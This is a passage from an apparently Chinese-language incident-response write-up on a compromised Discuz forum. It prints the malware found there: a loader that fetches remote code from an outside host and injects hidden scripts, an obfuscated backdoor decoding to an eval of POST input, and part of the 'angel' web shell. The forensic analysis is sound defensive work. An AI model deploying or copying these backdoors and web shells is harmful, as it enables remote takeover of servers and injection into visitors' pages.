$<span style="color: #ffcc66;">dataArr</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">':'</span>,$<span style="color: #ffcc66;">data</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">Keys</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">':'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(str_rot13(pack(</span><span style="color: #66cccc;">'H*'</span>,$<span style="color: #ffcc66;">dataArr</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>]))));
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">News</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">':'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(str_rot13(pack(</span><span style="color: #66cccc;">'H*'</span>,$<span style="color: #ffcc66;">dataArr</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>]))));
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">Links</span>= <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">':'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">base64_decode(str_rot13(pack(</span><span style="color: #66cccc;">'H*'</span>,$<span style="color: #ffcc66;">dataArr</span>[<span style="color: #cccccc; background-color: #2d2d2d;">2</span>]))));
<span style="background-color: #515151;"> </span>   @<span style="color: #99cc99;">include</span>($<span style="color: #ffcc66;">fileDir</span>.<span style="color: #66cccc;">'.Wh0AmI.MODEL'</span>);<span style="color: #f2777a; font-weight: bold;">die</span>;
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getdata</span>($<span style="color: #ffcc66;">data_url</span>){
<span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'curl_exec'</span>)) {
$<span style="color: #ffcc66;">sp_curl</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">curl_init(</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">curl_setopt(</span>$<span style="color: #ffcc66;">sp_curl</span>, <span style="color: #f2777a; font-weight: bold;">CURLOPT_URL</span>, $<span style="color: #ffcc66;">data_url</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">curl_setopt(</span>$<span style="color: #ffcc66;">sp_curl</span>, <span style="color: #f2777a; font-weight: bold;">CURLOPT_HEADER</span>, <span style="color: #cccccc; background-color: #2d2d2d;">0</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">curl_setopt(</span>$<span style="color: #ffcc66;">sp_curl</span>, <span style="color: #f2777a; font-weight: bold;">CURLOPT_CONNECTTIMEOUT</span>, <span style="color: #cccccc; background-color: #2d2d2d;">5</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">curl_setopt(</span>$<span style="color: #ffcc66;">sp_curl</span>, <span style="color: #f2777a; font-weight: bold;">CURLOPT_RETURNTRANSFER</span>, <span style="color: #cccccc; background-color: #2d2d2d;">1</span>);
$<span style="color: #ffcc66;">contents</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">curl_exec(</span>$<span style="color: #ffcc66;">sp_curl</span>);
@<span style="color: #cccccc; background-color: #2d2d2d;">curl_close(</span>$<span style="color: #ffcc66;">sp_curl</span>);
}<span style="color: #99cc99;">elseif</span>(<span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span><span style="color: #66cccc;">'stream_context_create'</span>)) {
$<span style="color: #ffcc66;">sp_cont</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'http'</span> =<span style="color: #6699cc;">&gt;</span> <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">'method'</span> =&gt; <span style="color: #66cccc;">'GET'</span>,<span style="color: #66cccc;">'timeout'</span> =&gt; <span style="color: #cccccc; background-color: #2d2d2d;">5</span>));
$<span style="color: #ffcc66;">sp_stre</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">stream_context_create(</span>$<span style="color: #ffcc66;">sp_cont</span>);
$<span style="color: #ffcc66;">contents</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span>$<span style="color: #ffcc66;">data_url</span>, <span style="color: #6699cc;">false</span>, $<span style="color: #ffcc66;">sp_stre</span>);
}<span style="color: #99cc99;">else</span>{
$<span style="color: #ffcc66;">handle</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">data_url</span>, <span style="color: #66cccc;">"rb"</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
$<span style="color: #ffcc66;">contents</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">stream_get_contents(</span>$<span style="color: #ffcc66;">handle</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
@<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">handle</span>);
}
<span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">contents</span>;
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">show</span>($<span style="color: #ffcc66;">fileDir</span>){
$<span style="color: #ffcc66;">filename</span>=$<span style="color: #ffcc66;">fileDir</span><span style="color: #f2777a; font-weight: bold;">.</span><span style="color: #cccccc; background-color: #2d2d2d;">md5(</span>$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_HOST'</span>].$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'REQUEST_URI'</span>]);
<span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">is_file(</span>$<span style="color: #ffcc66;">filename</span>)){
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">filename</span>,<span style="color: #66cccc;">'r'</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">data</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fread(</span>$<span style="color: #ffcc66;">fp</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">filename</span>));
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">empty(</span>$<span style="color: #ffcc66;">data</span>)) {@<span style="color: #cccccc; background-color: #2d2d2d;">unlink(</span>$<span style="color: #ffcc66;">filename</span>);<span style="color: #99cc99;">return</span>;}
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">dec0de(</span>$<span style="color: #ffcc66;">fileDir</span>,$<span style="color: #ffcc66;">data</span>);
} <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">data</span>=<span style="color: #cccccc; background-color: #2d2d2d;">getdata(</span><span style="color: #66cccc;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.$<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'HTTP_H</span><span style="color: #66cccc; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">fp</span>=@<span style="color: #cccccc; background-color: #2d2d2d;">fopen(</span>$<span style="color: #ffcc66;">filename</span>,<span style="color: #66cccc;">'w'</span>);
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">fp</span>,$<span style="color: #ffcc66;">data</span>);
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">fclose(</span>$<span style="color: #ffcc66;">fp</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">strlen(</span>$<span style="color: #ffcc66;">data</span>) &gt; <span style="color: #cccccc; background-color: #2d2d2d;">1000</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">dec0de(</span>$<span style="color: #ffcc66;">fileDir</span>,$<span style="color: #ffcc66;">data</span>);
<span style="background-color: #515151;"> </span>   }
}}
<span style="color: #99cc99;">if</span>(!<span style="color: #cccccc; background-color: #2d2d2d;">in_array(</span>$<span style="color: #ffcc66;">IP</span>,$<span style="color: #ffcc66;">KIP</span>)){
<span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">KBot</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">KBots</span>){<span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">stristr(</span>$<span style="color: #ffcc66;">Bot</span>,$<span style="color: #ffcc66;">KBots</span>)){
<span style="color: #cccccc; background-color: #2d2d2d;">show(</span>$<span style="color: #ffcc66;">fileDir</span>);
}}<span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">Key</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">Keys</span>){
<span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">stristr(</span>$<span style="color: #ffcc66;">Ref</span>,$<span style="color: #ffcc66;">Keys</span>)){
<span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #66cccc; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span>
</pre>
</div>
</li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">继续排查</h2>
<div class="outline-text-2" id="text-4">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><code>uc_client/control/class.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #cc99cc;">&lt;?php</span> $<span style="color: #ffcc66;">mt</span>=<span style="color: #66cccc;">"mFsKCleRfU"</span>; $<span style="color: #ffcc66;">ojj</span>=<span style="color: #66cccc;">"IEBleldle"</span>; $<span style="color: #ffcc66;">hsa</span>=<span style="color: #66cccc;">"E9TVFsnd2VuJ10p"</span>; $<span style="color: #ffcc66;">fnx</span>=<span style="color: #66cccc;">"Ow=="</span>; $<span style="color: #ffcc66; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = </span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">str_replace(</span><span style="color: #66cccc; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffcc66; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffcc66; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #66cccc; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffcc66; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffcc66; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #66cccc; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); $</span><span style="color: #ffcc66; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = $</span><span style="color: #ffcc66; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #66cccc; text-decoration: underline;">''</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">ef</span><span style="text-decoration: underline;">($</span><span style="color: #ffcc66; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #66cccc; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #66cccc; text-decoration: underline;">""</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">ojj</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">hsa</span><span style="color: #f2777a; font-weight: bold; text-decoration: underline;">.</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); $</span><span style="color: #ffcc66; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #cc99cc; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">

<pre class="src src-php">@<span style="color: #cccccc; background-color: #2d2d2d;">eval(</span>$<span style="color: #6699cc;">_POST</span>[<span style="color: #66cccc;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p>
</li>

<li><code>./uc_server/data/tmp/angel.php</code>

<div class="org-src-container">

<pre class="src src-php"><span style="color: #cc99cc;">&lt;?php</span>
<span style="color: #cccccc; background-color: #2d2d2d;">error_reporting(7</span>);
@<span style="color: #cccccc; background-color: #2d2d2d;">set_magic_quotes_runtime(0</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">ob_start(</span>);
$<span style="color: #ffcc66;">mtime</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">' '</span>, <span style="color: #cccccc; background-color: #2d2d2d;">microtime(</span>));
$<span style="color: #ffcc66;">starttime</span> = $<span style="color: #ffcc66;">mtime</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>] + $<span style="color: #ffcc66;">mtime</span>[<span style="color: #cccccc; background-color: #2d2d2d;">0</span>];
<span style="color: #cccccc; background-color: #2d2d2d;">define(</span><span style="color: #66cccc;">'SA_ROOT'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'\\'</span>, <span style="color: #66cccc;">'/'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">dirname(</span><span style="color: #6699cc;">__FILE__</span>)).<span style="color: #66cccc;">'/'</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">define(</span><span style="color: #66cccc;">'IS_WIN'</span>, <span style="color: #6699cc;">DIRECTORY_SEPARATOR</span> == <span style="color: #66cccc;">'\\'</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">define(</span><span style="color: #66cccc;">'IS_COM'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">class_exists(</span><span style="color: #66cccc;">'COM'</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">1</span> : <span style="color: #cccccc; background-color: #2d2d2d;">0</span> );
<span style="color: #cccccc; background-color: #2d2d2d;">define(</span><span style="color: #66cccc;">'IS_GPC'</span>, <span style="color: #cccccc; background-color: #2d2d2d;">get_magic_quotes_gpc(</span>));
$<span style="color: #ffcc66;">dis_func</span> = <span style="color: #cccccc; background-color: #2d2d2d;">get_cfg_var(</span><span style="color: #66cccc;">'disable_functions'</span>);
<span style="color: #cccccc; background-color: #2d2d2d;">define(</span><span style="color: #66cccc;">'IS_PHPINFO'</span>, (!<span style="color: #cccccc; background-color: #2d2d2d;">eregi(</span><span style="color: #66cccc;">"phpinfo"</span>,$<span style="color: #ffcc66;">dis_func</span>)) ? <span style="color: #cccccc; background-color: #2d2d2d;">1</span> : <span style="color: #cccccc; background-color: #2d2d2d;">0</span> );
@<span style="color: #cccccc; background-color: #2d2d2d;">set_time_limit(0</span>);@<span style="color: #cccccc; background-color: #2d2d2d;">preg_replace(</span><span style="color: #66cccc;">"/[email]/e"</span>,$<span style="color: #6699cc;">_POST</span>[<span style="color: #66cccc;">'Id'</span>],<span style="color: #66cccc;">"error"</span>);

<span style="color: #99cc99;">foreach</span>($<span style="color: #6699cc;">_POST</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span> =<span style="color: #6699cc;">&gt;</span> $<span style="color: #ffcc66;">value</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">IS_GPC</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">value</span> = <span style="color: #cccccc; background-color: #2d2d2d;">s_array(</span>$<span style="color: #ffcc66;">value</span>);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">$key</span> = $<span style="color: #ffcc66;">value</span>;
}
<span style="color: #999999; font-style: italic;">/*</span><span style="color: #999999; font-style: italic;">===================== &#31243;&#24207;&#37197;&#32622; =====================*/</span>

<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">echo encode_pass('angel');exit;</span>
<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#22914;&#26524;&#38656;&#35201;&#23494;&#30721;&#39564;&#35777;,&#35831;&#20462;&#25913;&#30331;&#38470;&#23494;&#30721;,&#30041;&#31354;&#20026;&#19981;&#38656;&#35201;&#39564;&#35777;</span>
$<span style="color: #ffcc66;">pass</span>  = <span style="color: #66cccc;">'ec38fe2a8497e0a8d6d349b3533038cb'</span>; <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">angel</span>

<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#22914;&#24744;&#23545; cookie &#20316;&#29992;&#33539;&#22260;&#26377;&#29305;&#27530;&#35201;&#27714;, &#25110;&#30331;&#24405;&#19981;&#27491;&#24120;, &#35831;&#20462;&#25913;&#19979;&#38754;&#21464;&#37327;, &#21542;&#21017;&#35831;&#20445;&#25345;&#40664;&#35748;</span>
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">cookie &#21069;&#32512;</span>
$<span style="color: #ffcc66;">cookiepre</span> = <span style="color: #66cccc;">''</span>;
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">cookie &#20316;&#29992;&#22495;</span>
$<span style="color: #ffcc66;">cookiedomain</span> = <span style="color: #66cccc;">''</span>;
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">cookie &#20316;&#29992;&#36335;&#24452;</span>
$<span style="color: #ffcc66;">cookiepath</span> = <span style="color: #66cccc;">'/'</span>;
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">cookie &#26377;&#25928;&#26399;</span>
$<span style="color: #ffcc66;">cookielife</span> = <span style="color: #cccccc; background-color: #2d2d2d;">86400</span>;

<span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">&#31243;&#24207;&#25628;&#32034;&#21487;&#20889;&#25991;&#20214;&#30340;&#31867;&#22411;</span>
!$<span style="color: #ffcc66;">writabledb</span> &amp;&amp; $<span style="color: #ffcc66;">writabledb</span> = <span style="color: #66cccc;">'php,cgi,pl,asp,inc,js,html,htm,jsp'</span>;
<span style="color: #999999; font-style: italic;">/*</span><span style="color: #999999; font-style: italic;">===================== &#37197;&#32622;&#32467;&#26463; =====================*/</span>

$<span style="color: #ffcc66;">charsetdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">''</span>,<span style="color: #66cccc;">'armscii8'</span>,<span style="color: #66cccc;">'ascii'</span>,<span style="color: #66cccc;">'big5'</span>,<span style="color: #66cccc;">'binary'</span>,<span style="color: #66cccc;">'cp1250'</span>,<span style="color: #66cccc;">'cp1251'</span>,<span style="color: #66cccc;">'cp12</span><span style="color: #66cccc; text-decoration: underline;">56'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'cp1257'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'cp850'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'cp852'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'cp866'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'cp932'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'dec8'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'euc-jp'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'euc-kr'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'gb2312'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'gbk'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'geostd8'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'greek'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'hebrew'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'hp8'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'keybcs2'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'koi8r'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'koi8u'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'latin1'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'latin2'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'latin5'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'latin7'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'macce'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'macroman'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'sjis'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'swe7'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'tis620'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'ucs2'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'ujis'</span><span style="text-decoration: underline;">,</span><span style="color: #66cccc; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">);</span>
<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'utf8'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=utf-8"</span>);
} <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'big5'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=big5"</span>);
} <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'gbk'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=gbk"</span>);
} <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'latin1'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=iso-8859-2"</span>);
} <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'euc-kr'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=euc-kr"</span>);
} <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">charset</span> == <span style="color: #66cccc;">'euc-jp'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">"content-Type: text/html; charset=euc-jp"</span>);
}

$<span style="color: #ffcc66;">self</span> = $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'PHP_SELF'</span>] ? $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'PHP_SELF'</span>] : $<span style="color: #6699cc;">_SERVER</span>[<span style="color: #66cccc;">'SCRIPT_NAME'</span>];
$<span style="color: #ffcc66;">timestamp</span> = <span style="color: #cccccc; background-color: #2d2d2d;">time(</span>);

<span style="color: #999999; font-style: italic;">/*</span><span style="color: #999999; font-style: italic;">===================== &#36523;&#20221;&#39564;&#35777; =====================*/</span>
<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">"logout"</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">scookie(</span><span style="color: #66cccc;">'loginpass'</span>, <span style="color: #66cccc;">''</span>, -<span style="color: #cccccc; background-color: #2d2d2d;">86400</span> * <span style="color: #cccccc; background-color: #2d2d2d;">365</span>);
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Location: '</span>.$<span style="color: #ffcc66;">self</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
}
<span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">pass</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'login'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">pass</span> == <span style="color: #cccccc; background-color: #2d2d2d;">encode_pass(</span>$<span style="color: #ffcc66;">password</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">scookie(</span><span style="color: #66cccc;">'loginpass'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">encode_pass(</span>$<span style="color: #ffcc66;">password</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">header(</span><span style="color: #66cccc;">'Location: '</span>.$<span style="color: #ffcc66;">self</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #6699cc;">_COOKIE</span>[<span style="color: #66cccc;">'loginpass'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #6699cc;">_COOKIE</span>[<span style="color: #66cccc;">'loginpass'</span>] != $<span style="color: #ffcc66;">pass</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">loginpage(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">loginpage(</span>);
<span style="background-color: #515151;"> </span>   }
}
<span style="color: #999999; font-style: italic;">/*</span><span style="color: #999999; font-style: italic;">===================== &#39564;&#35777;&#32467;&#26463; =====================*/</span>

$<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">''</span>;
!$<span style="color: #ffcc66;">action</span> &amp;&amp; $<span style="color: #ffcc66;">action</span> = <span style="color: #66cccc;">'file'</span>;

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#26597;&#30475;PHPINFO</span>
<span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">action</span> == <span style="color: #66cccc;">'phpinfo'</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #f2777a; font-weight: bold;">IS_PHPINFO</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">phpinfo(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">exit</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">errmsg</span> = <span style="color: #66cccc;">'phpinfo() function has non-permissible'</span>;
<span style="background-color: #515151;"> </span>   }
